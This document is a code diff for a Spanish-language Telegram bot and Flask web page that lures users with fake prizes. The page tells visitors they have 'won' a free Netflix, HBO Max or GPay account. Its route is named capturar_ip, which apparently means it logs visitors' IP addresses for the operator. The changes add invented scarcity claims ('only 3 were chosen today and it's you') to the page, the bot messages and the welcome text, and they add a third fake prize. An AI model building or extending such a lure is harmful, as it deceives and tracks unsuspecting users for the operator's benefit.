@@ -7,10 +7,10 @@ import requests
 import time
 import urllib.parse
 
-# --- CONFIGURACIÓN ---
-TOKEN_BOT = os.environ.get("TOKEN_BOT", "TU_TOKEN_AQUI")
-TU_CHAT_ID = int(os.environ.get("TU_CHAT_ID", "8542693021"))
-APP_URL = os.environ.get("APP_URL", "https://tu-app.up.railway.app") 
+# --- CONFIGURACIÓN POR VARIABLES DE ENTORNO (Railway) ---
+TOKEN_BOT = os.environ.get("TOKEN_BOT", "")
+TU_CHAT_ID = int(os.environ.get("TU_CHAT_ID", "0"))
+APP_URL = os.environ.get("APP_URL", "").rstrip('/') 
 
 bot = telebot.TeleBot(TOKEN_BOT)
 app = Flask("mi_bot_de_telegram")
@@ -111,7 +111,7 @@ def capturar_ip():
         </div>
         <div id="result-container">
             <div class="glitch" id="result-title">[ ACCESO CONCEDIDO ]</div>
-            <p class="subtext" style="color: #ddd; font-size: 1.2rem; margin-bottom: 30px;">Felicidades, has sido elegido para:</p>
+            <p class="subtext" style="color: #ddd; font-size: 1.2rem; margin-bottom: 30px;">🎉 ¡Solo 3 fueron elegidos hoy y eres tú!<br>Ganaste una cuenta de:</p>
             <div class="card" id="card-btn" onclick="reclamarCuenta()">
                 <img id="platform-logo" src="" alt="Plataforma">
                 <button class="btn-fake" id="platform-name">Reclamar Cuenta</button>
@@ -120,7 +120,7 @@ def capturar_ip():
         <script>
             var userId = "USER_ID_PLACEHOLDER";
             
-            const textos = ["Iniciando protocolo de seguridad...", "Buscando cuentas disponibles...", "Verificando región...", "Seleccionando tu premio aleatorio..."];
+            const textos = ["Iniciando protocolo de seguridad...", "Buscando cuentas disponibles...", "Verificando región...", "Seleccionando ganador..."];
             let i = 0;
             const loadingText = document.getElementById('loading-text');
             const interval = setInterval(() => {
@@ -137,14 +137,19 @@ def capturar_ip():
                 const logo = document.getElementById('platform-logo');
                 const name = document.getElementById('platform-name');
                 
-                if (Math.random() < 0.5) {
+                const random = Math.random() * 3;
+                if (random < 1) {
                     logo.src = "https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png";
                     name.innerText = "Netflix";
                     plataformaGanadora = "Netflix";
-                } else {
+                } else if (random < 2) {
                     logo.src = "https://upload.wikimedia.org/wikipedia/commons/d/d3/HBO_Max_2025_logo.svg";
                     name.innerText = "HBO Max";
                     plataformaGanadora = "HBO Max";
+                } else {
+                    logo.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Google_Play_Store_icon_2022.svg/512px-Google_Play_Store_icon_2022.svg.png";
+                    name.innerText = "GPay";
+                    plataformaGanadora = "GPay";
                 }
                 resultBox.style.display = 'block';
             }, 3000);
@@ -178,9 +183,11 @@ def reclamar_cuenta():
     try:
         # AQUÍ PONES LAS CUENTAS QUE LE VAS A ENTREGAR
         if plataforma == "Netflix":
-            mensaje_cuenta = "🎉 ¡Felicidades! Ganaste una cuenta de Netflix.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
+            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nGanaste una cuenta de Netflix.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
+        elif plataforma == "HBO Max":
+            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nGanaste una cuenta de HBO Max.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
         else:
-            mensaje_cuenta = "🎉 ¡Felicidades! Ganaste una cuenta de HBO Max.\n\nUsuario: tu_cliente@correo.com\nContraseña: 12345678"
+            mensaje_cuenta = "🎉 ¡Felicidades! Solo 3 fueron elegidos y eres tú.\n\nFuiste elegido para GPay."
             
         bot.send_message(user_id, mensaje_cuenta)
         return "OK"
@@ -209,11 +216,11 @@ def enviar_bienvenida(message):
     except Exception as e:
         print("Error enviando a admin:", e)
 
-    # EL NUEVO MENSAJE BONITO DE BIENVENIDA
     texto_cliente = (
         f"🌟 <b>Bienvenido al Bot de Cuentas Premium</b> 🌟\n\n"
         f"👋 Hola <b>{nombre}</b>, gracias por unirte a nuestra comunidad.\n\n"
-        f"🎬 En esta oportunidad, participarás por una cuenta aleatoria de <b>Netflix</b> o <b>HBO Max</b>.\n\n"
+        f"🎉 <b>¡FELICIDADES!</b> Eres uno de los <b>3 elegidos</b> de hoy.\n\n"
+        f"🎬 Has sido seleccionado para reclamar una cuenta de <b>Netflix</b>, <b>HBO Max</b> o <b>GPay</b>.\n\n"
         f"👇 Presiona el botón de abajo para verificar tu acceso y descubrir cuál te tocó:"
     )
     
@@ -225,7 +232,6 @@ def enviar_bienvenida(message):
     markup.add(InlineKeyboardButton("✅ Verificar y Ver mi Cuenta", url=boton_url))
     
     try:
-        # Usamos parse_mode='HTML' para que las negritas funcionen y se vea bonito
         bot.send_message(message.chat.id, texto_cliente, reply_markup=markup, parse_mode='HTML')
     except Exception as e:
         print("Error enviando botón:", e)
